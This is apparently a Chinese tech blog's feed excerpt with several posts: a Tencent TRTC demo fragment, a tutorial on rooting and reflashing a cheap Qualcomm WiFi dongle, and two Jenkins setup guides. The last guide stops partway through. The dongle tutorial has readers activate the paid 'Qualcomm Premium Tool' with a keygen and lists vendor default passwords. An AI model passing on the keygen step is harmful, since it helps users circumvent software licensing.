class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>引入客户端生成<code>userSig</code>相关文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./js/clipboard.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./js/lib-generate-test-usersig.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./js/generateTestUserSig.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>传入参数 登录，之后就可以呼叫 监听事件等等（<a href="https://cloud.tencent.com/document/product/647/78756）" target="_blank" rel="noopener">https://cloud.tencent.com/document/product/647/78756）</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;</span><br><span class="line">    TUICallEngine,</span><br><span class="line">    TUICallEvent</span><br><span class="line">  &#125; = <span class="built_in">window</span>[<span class="string">'tuicall-engine-webrtc'</span>]</span><br><span class="line">  <span class="keyword">let</span> options = &#123;</span><br><span class="line">    SDKAppID: sdkAppId, <span class="comment">// 接入时需要将 0 替换为您的云通信应用的 SDKAppID</span></span><br><span class="line">    tim: <span class="literal">null</span> <span class="comment">// tim 参数适用于业务中已存在 TIM 实例，为保证 TIM 实例唯一性</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log()</span><br><span class="line">  <span class="keyword">let</span> tuiCallEngine = TUICallEngine.createInstance(options);</span><br><span class="line">  tuiCallEngine.login(&#123;</span><br><span class="line">    userID: userId,</span><br><span class="line">    userSig: userSig,</span><br><span class="line">  &#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// success</span></span><br><span class="line">  &#125;).catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.warn(<span class="string">'login error:'</span>, error)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure></li><li><p>Web端没看到有通话组件的（呼叫界面、接听界面）</p></li></ol><h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><ul><li>如果呼叫一个从未登录过得用户  不会唤起UI 只会提示呼叫成功</li><li>当你呼叫未登录过得用户后，再去呼叫正常的用户也不会拉起UI</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Uniapp使用腾讯实时音视频（demo）&quot;&gt;&lt;a href=&quot;#Uniapp使用腾讯实时音视频（demo）&quot; class=&quot;headerlink&quot; title=&quot;Uniapp使用腾讯实时音视频（demo）&quot;&gt;&lt;/a&gt;Uniapp使用腾讯实时音视频（demo）&lt;/
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="实时音视频" scheme="//www.shen.ee/tags/%E5%AE%9E%E6%97%B6%E9%9F%B3%E8%A7%86%E9%A2%91/"/>
    
      <category term="IM实时音视频" scheme="//www.shen.ee/tags/IM%E5%AE%9E%E6%97%B6%E9%9F%B3%E8%A7%86%E9%A2%91/"/>
    
      <category term="前端实时音视频" scheme="//www.shen.ee/tags/%E5%89%8D%E7%AB%AF%E5%AE%9E%E6%97%B6%E9%9F%B3%E8%A7%86%E9%A2%91/"/>
    
      <category term="腾讯实时音视频" scheme="//www.shen.ee/tags/%E8%85%BE%E8%AE%AF%E5%AE%9E%E6%97%B6%E9%9F%B3%E8%A7%86%E9%A2%91/"/>
    
      <category term="TUICallKit" scheme="//www.shen.ee/tags/TUICallKit/"/>
    
  </entry>
  
  <entry>
    <title>随身wifi刷机折腾记</title>
    <link href="//www.shen.ee/article/11627.html"/>
    <id>//www.shen.ee/article/11627.html</id>
    <published>2022-06-28T03:23:59.000Z</published>
    <updated>2022-06-28T03:25:18.098Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先感谢酷安<code>随身 Wi-FI</code>社区，里面有很多参考资料，但是对小白上手不太友好，刚好我也是第一次刷，所以我这边就写了一篇完整的图文教程，希望可以帮到你。</p><h2 id="购买随身-Wi-Fi"><a href="#购买随身-Wi-Fi" class="headerlink" title="购买随身 Wi-Fi"></a>购买随身 Wi-Fi</h2><p>现在市面上的大部分随身 Wi-Fi 除了最基本充当网络热点的功能以外，它还是一块非常标准的<code>高通410/210开发板</code>（这取决于你的购买），而且它跑的还是安卓系统。可以刷 <code>debian</code> 系统，甚至你还能刷 <code>openwrt</code> 成为软路由，更棒的是 4G 和 Wi-Fi 、USB 等功能都正常工作。</p><p>一般的商家宣传说的无需插卡其实都是内置了 eSIM卡，但大部分还是留有卡槽(大卡槽，小卡需要卡套)，切记不要激活他内置的流量卡，说白了就是物联网卡，流量不仅贵不说而且还虚标！</p><p>我是在京东买的讯唐，日常活动券后价 29，买最基础的就行，链接：<a href="https://u.jd.com/cdVKZYw" target="_blank" rel="noopener">https://u.jd.com/cdVKZYw</a></p><p><img src="https://oss.iyouhun.com/img/md/WechatIMG1927.jpeg" alt="WechatIMG1927"></p><p>用完红包一系列骚操作下来9块钱拿下。</p><h3 id="插入一个小小的开箱环节"><a href="#插入一个小小的开箱环节" class="headerlink" title="插入一个小小的开箱环节"></a>插入一个小小的开箱环节</h3><p>到货，有点廉价感</p><p><img src="https://oss.iyouhun.com/img/md/WechatIMG1924.jpeg" alt="WechatIMG1924"></p><p>中规中矩的外观，没办法直接插卡，需要拆卸装卡</p><p><img src="https://oss.iyouhun.com/img/md/WechatIMG1926.jpeg" alt="WechatIMG1926"></p><p>拔掉 USB 帽，背面可以看到两个螺钉，先不要急着拆看后面的检查！</p><p><img src="https://oss.iyouhun.com/img/md/WechatIMG1928.jpeg" alt="WechatIMG1928"></p><h3 id="推荐随身-Wi-Fi"><a href="#推荐随身-Wi-Fi" class="headerlink" title="推荐随身 Wi-Fi"></a>推荐随身 Wi-Fi</h3><blockquote><p>来源网络，你可以根据你的情况来，也可以直接上我买的那个讯唐</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">铁恒信旗舰店 54 元款：UFI003 （后台密码 admin、切卡密码 UFIadmin1234）</span><br><span class="line">天天特卖工厂店 29 元款：SP970-Main-v2（后台：admin admin，切卡用酷安工具，无法直接进 9008，openwrt wifi 有问题不推荐）</span><br><span class="line">酷翼旗舰店 8.8 元款：UFI003 （后台密码 admin、切卡密码 无）</span><br><span class="line">纽皇 6.8 元款：可能是 UFI001W ？？？（后台密码 admin、切卡密码：qr0521）但会抽奖碰到高通 210 款</span><br><span class="line">天天特卖工厂店 28 元款 UFI001 C （后台密码 admin、切卡密码：UFIadmin1234，现在改成没卡槽了）</span><br></pre></td></tr></table></figure><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol><li><strong>高通410（msm8916）方案的随身 Wi-Fi</strong>：板子上的丝印是 UFI001B、UFI001C、UFI003、UFI-W-001 最好，或者 SP970（不推荐，细分版本目前13个太多，基本要短接才能进 9008 模式，然后现在的 openwrt Wi-Fi 也有问题）、UZ801 也 OK；<strong>需要带卡槽、能切卡</strong>。</li><li><strong>一台 Windows 电脑</strong>（建议安装火绒，一些文件会被 Win 默认防护当病毒删除）</li><li><strong>小卡转大卡 SIM 卡套</strong></li><li><strong>螺丝刀</strong>（拧随身 Wi-Fi 十字小螺丝）</li></ol><h3 id="下载工具和资源"><a href="#下载工具和资源" class="headerlink" title="下载工具和资源"></a>下载工具和资源</h3><p><img src="https://oss.iyouhun.com/img/md/image-20220628111257659.png" alt="image-20220628111257659"></p><p><a href="https://cloud.189.cn/web/share?code=mAzaeaVzMNni" target="_blank" rel="noopener">刷机需要的工具文件（访问码：h5ft）</a></p><p><a href="https://www.kancloud.cn/a813630449/ufi_car/2792820" target="_blank" rel="noopener">「苏苏小亮亮」编译的 openwrt</a></p><h3 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h3><ul><li><p>进入 9008模式</p><ul><li><p>就是按住板子上的复位按钮，如果没拆机那就拿针按住然后插入电脑</p></li><li><p>可以从电脑的设备管理器查看端口有无 9008</p><p><img src="https://oss.iyouhun.com/img/md/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220625201524.png" alt="微信截图_20220625201524"></p></li></ul></li><li><p>面具（Magisk）</p><ul><li><em>Magisk</em>是一套用于定制 Android的开源工具</li><li>root、引导脚本、 SELInux修补、移除AVB2.0/dm- verity/强制加密等</li><li>主打模块管理功能的软件，有了它后边你就可以安装免流模块或者 V2，本文不做讨论</li></ul></li><li><p>adb</p><ul><li><em>adb</em>的全称为Android Debug Bridge</li><li>起到调试桥的作用，简单来说就是可以通过这个命令用电脑控制手机。</li></ul></li><li><p>fastboot模式</p><ul><li>翻译过来就是快速启动</li><li>fastboot是一种比<a href="https://product.pconline.com.cn/itbk/sjtx/sj/1111/2590367.html" target="_blank" rel="noopener">recovery</a>更底层的<a href="https://product.pconline.com.cn/itbk/sjtx/sj/1109/2517557.html" target="_blank" rel="noopener">刷机</a>模式</li><li>使用USB数据线连接手机的一种刷机模式</li></ul></li></ul><h2 id="基础安装"><a href="#基础安装" class="headerlink" title="基础安装"></a>基础安装</h2><h3 id="安装9008驱动"><a href="#安装9008驱动" class="headerlink" title="安装9008驱动"></a>安装9008驱动</h3><p>我们先安装需要的9008驱动。打开<code>9008免签名驱动</code>文件夹，安装驱动。</p><p><img src="https://oss.iyouhun.com/img/md/image-9008install.png" alt="image-9008install"></p><p>点击立即安装即可。</p><h3 id="安装高通刷机工具"><a href="#安装高通刷机工具" class="headerlink" title="安装高通刷机工具"></a>安装高通刷机工具</h3><p>打开 <code>Qualcomm Premium Tool V2.4</code> 文件夹。</p><ol><li><p>先用注册机生成<code>.key</code>文件。</p></li><li><p>保存<code>.key</code>文件</p></li></ol><p><img src="https://oss.iyouhun.com/img/md/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220625204332.png" alt="微信截图_20220625204332"></p><ol><li><p>打开<code>Premium Tool v2.4</code>。点击<code>Help</code>下的<code>Activate</code>激活，选择你刚才保存的<code>.key</code>文件即可激活成功</p><p><img src="https://oss.iyouhun.com/img/md/image-Premium-active.png" alt="image-Premium-active"></p></li></ol><h3 id="安装ARDC投屏软件并进行简单优化"><a href="#安装ARDC投屏软件并进行简单优化" class="headerlink" title="安装ARDC投屏软件并进行简单优化"></a>安装ARDC投屏软件并进行简单优化</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>打开 <code>投屏软件 ARDC</code> 文件夹，安装ARDC，请保持默认，一路确认即可。</p><p><img src="https://oss.iyouhun.com/img/md/%E6%8A%95%E5%B1%8F%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85.png" alt="投屏软件安装"></p><p>拔掉随身Wifi，重新插回电脑，此时设备灯亮，说明进入正常adb模式了。</p><p>打开ARDC，程序会通过adb的方式推送投屏软件到随身Wifi上。完成以后如图所示，点击鼠标右键进入桌面。</p><p><img src="https://oss.iyouhun.com/img/md/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220625203442.png" alt="微信截图_20220625203442"></p><p><img src="https://oss.iyouhun.com/img/md/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220625203546.png" alt="微信截图_20220625203546"></p><p>桌面</p><p><img src="https://oss.iyouhun.com/img/md/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220625205240.png" alt="微信截图_20220625205240"></p><h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><p>毕竟这么小的设备上跑安卓系统，我们可以做一下优化，要不然太卡了。</p><p>进入设置 =&gt; 关于本机 =&gt; 点击 10 次版本号进入开发者模式，把所有动画特效都关掉。</p><p><img src="https://oss.iyouhun.com/img/md/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220625203654.png" alt="微信截图_20220625203654"></p><h2 id="检查和备份"><a href="#检查和备份" class="headerlink" title="检查和备份"></a>检查和备份</h2><h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3><p>请先确认插上随身Wifi后，电脑是不是识别出来了硬件，诸如<strong>adb或者Android的字眼</strong>，这都意味着你的机器是<strong>可以不拆机破解</strong>的，他的adb端口是开的。连上随身 Wi-Fi 提供的 Wi-Fi，进入后台，检查下是否能正常工作，防止到手就是坏的。</p><p><img src="https://oss.iyouhun.com/img/md/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220625163655.png" alt="微信截图_20220625163655"></p><p>然后用螺丝刀拆开检查板子，是否有卡槽，以及上面的版本丝印。</p><p>如下图，小按钮旁边那个就是卡槽，注意：图中最左边的顶部那里是信号天线，有些人拆了之后插卡测试没网或者信号不好可能就是忘记装了这个东西！</p><p><img src="https://oss.iyouhun.com/img/md/WechatIMG1925.jpeg" alt="WechatIMG1925"></p><p>我的这款丝印是：<code>UFI003_MB_V002</code> 三网通，不用切卡不用刷基带，插卡直接用！忽然没了折腾的意义，哈哈哈。</p><p><strong>检查的重要性</strong></p><p>酷安一个友友，和我的设备一样。私信我他刚买来插卡没有网络…</p><p><img src="https://oss.iyouhun.com/img/md/WechatIMG1932.jpeg" alt="WechatIMG1932"></p><h3 id="备份原厂固件分区镜像"><a href="#备份原厂固件分区镜像" class="headerlink" title="备份原厂固件分区镜像"></a>备份原厂固件分区镜像</h3><p>做好全量备份就不会变砖，随时刷成到手的状态。</p><p>进入 9008 模式，打开Premium Tool v2.4。</p><p>依次点击<code>Qualcomm</code> 、<code>partition</code>，然后点击<code>Scan</code>分区、<code>Do job</code>扫描。</p><p><img src="https://oss.iyouhun.com/img/md/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220625211334.png" alt="微信截图_20220625211334"></p><p>再依次点击<code>Backup</code>，<code>Backup All</code>，<code>Do job</code>备份即可</p><p><img src="https://oss.iyouhun.com/img/md/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220625211402.png" alt="微信截图_20220625211402"></p><h3 id="制作救砖包"><a href="#制作救砖包" class="headerlink" title="制作救砖包"></a>制作救砖包</h3><p>安装<code>Miko_pro</code>，并复制<code>loader.exe</code>到安装目录。打开<code>loader.exe</code>。</p><p>然后在 <code>miko</code> 里依次选择 <code>Read</code> ，<code>Partition Backup/Earese</code> 点击左下角 <code>Load Partition Structure</code> 看到右边有系统信息的输出就说明连上了</p><p><img src="https://oss.iyouhun.com/img/md/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220625201814.png" alt="微信截图_20220625201814"></p><p>然后点击 <code>Read Full Image</code> 选个路径，取个名字就开始全量备份救砖能用的 <code>.bin</code> 文件。过程会比较慢，可能要十几分钟。</p><p><img src="https://oss.iyouhun.com/img/md/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220625202228.png" alt="微信截图_20220625202228"></p><p><img src="https://oss.iyouhun.com/img/md/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220625202338.png" alt="微信截图_20220625202338"></p><p>等到跑完进度条 100% 右边的输出显示 success 就备份好了，我们就能开始随意折腾。</p><p><img src="https://oss.iyouhun.com/img/md/%E5%A4%87%E4%BB%BD%E6%88%90%E5%8A%9F.png" alt="备份成功"></p><h3 id="备份原厂基带"><a href="#备份原厂基带" class="headerlink" title="备份原厂基带"></a>备份原厂基带</h3><p>打开 星海恢复 备份 生成 修改QCN工具 文件夹中的星海SVIP</p><p><img src="https://oss.iyouhun.com/img/md/%E6%98%9F%E6%B5%B7svip-%E5%9F%BA%E5%B8%A6%E5%A4%87%E4%BB%BD.png" alt="星海svip-基带备份"></p><p>随身wifi正常工作状态下，点击上方的高通，先点击联机，再点击备份QCN，选择路径来备份你的基带。点击一键执行即可。</p><h2 id="刷入面具（Magist）获取-Root-权限"><a href="#刷入面具（Magist）获取-Root-权限" class="headerlink" title="刷入面具（Magist）获取 Root 权限"></a>刷入面具（Magist）获取 Root 权限</h2><h3 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h3><p><strong>安装<code>Magist</code></strong></p><p>随身 Wi-Fi 插在电脑上，打开 ARDC 投屏软件，等待设备投屏成功。</p><p>直接将资源<code>面具Magist</code>文件夹里的<code>Magisk-v22.0.apk</code>拖动到 ARDC 窗口中</p><p><img src="https://oss.iyouhun.com/img/md/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220625205049.png" alt="微信截图_20220625205049"></p><p><strong>修补面具</strong></p><p>随身Wifi插在电脑上不要动，打开 <code>搞机工具箱_钟晨酱</code> 文件夹</p><p><img src="https://oss.iyouhun.com/img/md/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220625212438.png" alt="微信截图_20220625212438"></p><p>先点击<code>Fastboot(BL)</code>进入<code>Fastboot</code>模式</p><p>然后分区选择<code>Boot</code>, 右侧选择<code>14.5magisk修补boot.img</code>然后输入即可。刷写速度非常快，提示完成即可关闭。</p><p>接着拔掉随身wifi并重新插入，打开<code>ardc</code>，进入桌面打开<code>magisk</code>。可以看到当前已安装，并获得了root权限。</p><p><img src="https://oss.iyouhun.com/img/md/%E9%9D%A2%E5%85%B71.png" alt="面具1"></p><h3 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h3><blockquote><p>也可以直接刷入一些整合镜像内就包含了面具及一些常用软件。</p></blockquote><p>我这里用的是酷安一个大佬分享的可以<strong>一键刷入UFI003</strong></p><p>按复位按钮插入电脑，进入 9008 模式，打开<code>MiFlash</code>，点击刷新查看设备是否连接上。</p><p><img src="https://oss.iyouhun.com/img/md/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220625221344.png" alt="微信截图_20220625221344"></p><p>点击浏览选择刷机包，选择保留所有数据，点击刷机即可。</p><p><img src="https://oss.iyouhun.com/img/md/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220625221444.png" alt="微信截图_20220625221444"></p><p>时间有点慢，耐心等待一下，成功状态列会有显示。</p><p><img src="https://oss.iyouhun.com/img/md/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220625222506.png" alt="微信截图_20220625222506"></p><p>成功后可以直接打开<code>ARDC</code>查看。</p><p><img src="https://oss.iyouhun.com/img/md/%E5%88%B7%E5%AE%8C%E5%90%8E%E7%9A%84%E6%A1%8C%E9%9D%A2.png" alt="刷完后的桌面"></p><p>Ps：不要随便刷入整合镜像！除非和你是同品牌同型号！</p><h2 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h2><h3 id="不支持全网通-刷写基带"><a href="#不支持全网通-刷写基带" class="headerlink" title="不支持全网通(刷写基带)"></a>不支持全网通(刷写基带)</h3><p>大部分 UFI00X 丝印的随身 Wi-Fi 都是支持电信卡的，很多其实也支持联通，移动大概率默认是不支持的。当然因为产品众多，甚至丝印型号相同用的 modem 型号都有差别，当然最麻烦的其实也是这一步，不能保证你刷了基带后移动联通就能正常使用，还是更推荐电信或联通用户使用。</p><ol><li><p>先使用<code>搞机工具箱</code>重启进入 <code>fastboot</code> 模式。</p></li><li><p>然后打开`星海工具箱 =&gt; 选择高通 =&gt; 选择高通基带擦除 =&gt; 一键执行，完成后会重启。(如果你的星海无法打开你可能得安装下<a href="https://docs.microsoft.com/en-US/cpp/windows/latest-supported-vc-redist?view=msvc-170" target="_blank" rel="noopener">微软的这个包</a>)</p><p><img src="https://oss.iyouhun.com/img/md/202206021947102.png" alt="202206021947102"></p></li><li><p>然后勾选写入 QCN，选择全网通的基带写入。会可能一次写入不成功，多写入几次。重启随身 Wi-Fi，看看你的卡能不能正常工作。</p></li></ol><h3 id="默认没开-adb-的设备"><a href="#默认没开-adb-的设备" class="headerlink" title="默认没开 adb 的设备"></a>默认没开 adb 的设备</h3><p>如果你的型号是 UFI001W 等，可能你到手设备并没有打开 adb 功能，你可以在 web 管理后台尝试重置。例如我讯唐的后台地址是：<code>192.168.100.1</code>，其他的参照你随身WiFi的说明书或者随身WiFi机身上的地址。</p><p>如果仍然不行。直接 9008 模式用 miflash 工具刷别人改好的包（安装面具的方式二就是），浏览里选择下载解压好的包，刷新勾选设备，点击刷机即可。会直接开启adb、锁定插入的 SIM 卡、和 root 等功能。</p><h3 id="成砖挽救"><a href="#成砖挽救" class="headerlink" title="成砖挽救"></a>成砖挽救</h3><p>备份大法好，备份大法好，备份大法好！</p><p>进入<code>9008模式</code>，进入<code>miko</code>，点击<code>flash</code>，点击<code>emmc block0 flasher</code>。</p><p>下方选择备份部分<em>制作救砖包</em>中生成的救砖包（.bin文件），耐心等待刷入即可。</p><p><img src="https://oss.iyouhun.com/img/md/%E6%95%91%E7%A0%96%E5%8C%85%E5%88%B7%E5%85%A5.png" alt="救砖包刷入"></p><h3 id="刷好后插入别的卡没网络"><a href="#刷好后插入别的卡没网络" class="headerlink" title="刷好后插入别的卡没网络"></a>刷好后插入别的卡没网络</h3><p>很有可能是你刷入了整合包，自带了锁定 SIM 卡功能，可以插卡重新刷写一遍试试。</p><h3 id="烫得要死"><a href="#烫得要死" class="headerlink" title="烫得要死"></a>烫得要死</h3><p>随身WiFi用一段时间就会发热的厉害，甚至自动关机。没办法本来就这么一个小小躯体承载了太多，动手能力强的可以自己淘宝买一些小风扇或者散热片改装一下，手残的可以直接买别人改好的。</p><p>可按照该商品规格购买：<a href="https://m.tb.cn/h.fvmcIWv?tk=XCOV2LYWDGA" target="_blank" rel="noopener">https://m.tb.cn/h.fvmcIWv?tk=XCOV2LYWDGA</a></p><h2 id="来个总结"><a href="#来个总结" class="headerlink" title="来个总结"></a>来个总结</h2><p>目前随身 WiFi 市场除了大品牌有自研芯片、方案。大部分无良商家都是贴牌，成本很便宜也懒得去给加各种限制，采用相同的方案那就意味着大部分都可以刷机，刷机方法大同小异，最多就是刷机包的不同。而且目前社区解决方案多，资料完善，破解方便。</p><p>可能大家感觉折腾下来和刚买来没什么区别，但是我们首先不需要使用商家内置的SIM卡了，而且永久解锁SIM卡槽，防止商家远程施法！本文只是基础的刷机 root，但是相当于打通了任督二脉，无往而不利，接下来你随便折腾！可以刷入<code>openwrt</code>做旁路由、刷入<code>debian</code>做小型服务器等… 万物皆可刷！</p><p>最后，9块钱的随身 WiFi 真香，拜了个拜！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;首先感谢酷安&lt;code&gt;随身 Wi-FI&lt;/code&gt;社区，里面有很多参考资料，但是对小白上手不太友好，刚好我也是第一次刷，所以我这边就写了
      
    
    </summary>
    
      <category term="资源" scheme="//www.shen.ee/categories/%E8%B5%84%E6%BA%90/"/>
    
    
      <category term="随身Wifi刷机" scheme="//www.shen.ee/tags/%E9%9A%8F%E8%BA%ABWifi%E5%88%B7%E6%9C%BA/"/>
    
      <category term="随身Wifi破解" scheme="//www.shen.ee/tags/%E9%9A%8F%E8%BA%ABWifi%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="随身Wifi免流" scheme="//www.shen.ee/tags/%E9%9A%8F%E8%BA%ABWifi%E5%85%8D%E6%B5%81/"/>
    
      <category term="随身Wifi刷入面具" scheme="//www.shen.ee/tags/%E9%9A%8F%E8%BA%ABWifi%E5%88%B7%E5%85%A5%E9%9D%A2%E5%85%B7/"/>
    
      <category term="随身WiFi-Root" scheme="//www.shen.ee/tags/%E9%9A%8F%E8%BA%ABWiFi-Root/"/>
    
      <category term="随身wifi固件" scheme="//www.shen.ee/tags/%E9%9A%8F%E8%BA%ABwifi%E5%9B%BA%E4%BB%B6/"/>
    
      <category term="随身WiFi刷写boot" scheme="//www.shen.ee/tags/%E9%9A%8F%E8%BA%ABWiFi%E5%88%B7%E5%86%99boot/"/>
    
  </entry>
  
  <entry>
    <title>Jenkins Generic Webhook Trigger 插件使用</title>
    <link href="//www.shen.ee/article/27057.html"/>
    <id>//www.shen.ee/article/27057.html</id>
    <published>2022-06-22T03:01:39.000Z</published>
    <updated>2022-06-22T06:24:25.993Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Coding项目-Webhook-设置"><a href="#Coding项目-Webhook-设置" class="headerlink" title="Coding项目 Webhook 设置"></a>Coding项目 Webhook 设置</h4><p>1.进入项目设置 =&gt; 开发者选项 =&gt; Service Hook =&gt; 新建Service Hook</p><p><img src="https://oss.iyouhun.com/img/QQ20211110-102931@2x.png" alt=""></p><p>2.根据你的项目选择不同的事件触发类型及过滤条件</p><p><img src="https://oss.iyouhun.com/img/QQ20211110-103147@2x.png" alt=""></p><p>3.配置发送方式</p><p><strong>执行动作</strong>：默认就行</p><p><strong>服务URL</strong>：就是你的<code>generic-webhook-trigger</code>调用地址，<a href="http://JENKINS_URL/generic-webhook-trigger/invoke" target="_blank" rel="noopener">http://JENKINS_URL/generic-webhook-trigger/invoke</a></p><p>例如：<a href="http://108.108.108.108:8080/generic-webhook-trigger/invoke" target="_blank" rel="noopener">http://108.108.108.108:8080/generic-webhook-trigger/invoke</a></p><p><strong>构建 Token</strong>：自定义即可，下面项目发布设置会用到</p><p>其他不必填的根据自己实际需求填写</p><p><img src="https://oss.iyouhun.com/img/QQ20211110-105206@2x.png" alt=""></p><h4 id="项目发布设置"><a href="#项目发布设置" class="headerlink" title="项目发布设置"></a>项目发布设置</h4><p>1.点击 Jenkins项目的构建环境</p><p>2.选择 <code>Generic Webhook Trigger</code></p><p><img src="https://oss.iyouhun.com/img/QQ20211110-101342@2x.png" alt=""></p><p>3.输入对应 token 保存</p><p><img src="https://oss.iyouhun.com/img/QQ20211110-101342@2x.png" alt=""></p><ol><li>push 一下，成功自动构建</li></ol><p><img src="https://oss.iyouhun.com/img/QQ20211110-102341@2x.png" alt=""></p><p><img src="https://oss.iyouhun.com/img/QQ20211110-102456@2x.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Coding项目-Webhook-设置&quot;&gt;&lt;a href=&quot;#Coding项目-Webhook-设置&quot; class=&quot;headerlink&quot; title=&quot;Coding项目 Webhook 设置&quot;&gt;&lt;/a&gt;Coding项目 Webhook 设置&lt;/h4&gt;&lt;p&gt;1.
      
    
    </summary>
    
      <category term="工具" scheme="//www.shen.ee/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Jenkins" scheme="//www.shen.ee/tags/Jenkins/"/>
    
      <category term="Generic Webhook Trigger" scheme="//www.shen.ee/tags/Generic-Webhook-Trigger/"/>
    
      <category term="jenkins插件" scheme="//www.shen.ee/tags/jenkins%E6%8F%92%E4%BB%B6/"/>
    
      <category term="coding插件" scheme="//www.shen.ee/tags/coding%E6%8F%92%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>Jenkins Publish over SSH 插件配置及服务器互信</title>
    <link href="//www.shen.ee/article/29773.html"/>
    <id>//www.shen.ee/article/29773.html</id>
    <published>2022-06-22T02:53:39.000Z</published>
    <updated>2022-06-22T06:24:25.994Z</updated>
    
    <content type="html"><![CDATA[<h3 id="服务器互信"><a href="#服务器互信" class="headerlink" title="服务器互信"></a>服务器互信</h3><blockquote><p>A服务器：Jenkins 所在服务器</p><p>B 服务器：项目部署所在服务器</p></blockquote><p>A 服务器生成秘钥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line"><span class="meta">#</span><span class="bash"> 一路回车</span></span><br></pre></td></tr></table></figure><p>A 服务器 将本地的ssh公钥文件安装到远程主机对应的账户下 （也可以手动复制，推荐命令）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 执行命令后输入密码完成复制</span></span><br><span class="line">ssh-copy-id root@B服务器IP</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">端口不一致复制方法</span></span><br><span class="line">ssh-copy-id -i /root/.ssh/id_rsa.pub "-p 1008 root@B服务器IP"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 